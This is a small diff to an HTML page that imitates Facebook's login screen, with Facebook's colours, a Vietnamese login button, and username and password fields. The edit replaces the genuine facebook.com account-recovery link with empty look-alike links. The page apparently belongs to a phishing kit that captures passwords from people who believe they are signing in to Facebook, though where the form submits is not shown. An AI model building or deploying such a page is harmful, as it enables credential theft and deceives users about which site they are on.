@@ -20,8 +20,14 @@
 					<input name="username" type="text" placeholder="Email address or phone number"></input><br /><br />
 					<input name="password" id="password" type="password" placeholder="Password">></input><br />
 					<input type="submit" name="submit" value="Đăng Nhập" style="background: none repeat scroll 0 0 #3b5998; border: 1px solid #294461; color: #ffffff; margin: 4px 0 0 80px; padding: 2px 6px;"></input>
-                                        <div class="_6ltj"><a href="https://www.facebook.com/recover/initiate/?ars=facebook_login">Quên mật khẩu?</a></div>
-						</form>
+					<div class="forgot">
+								<a href="">Forgotten account?</a>
+							</div>
+							<div class="create-btn">
+								<a href="" class="btn">create new account</a>
+							</div>	
+				</form>
+			<p><a href="">Create a Page</a> for a celebrity, band or business.</p>
 </div>
 		
 </body>
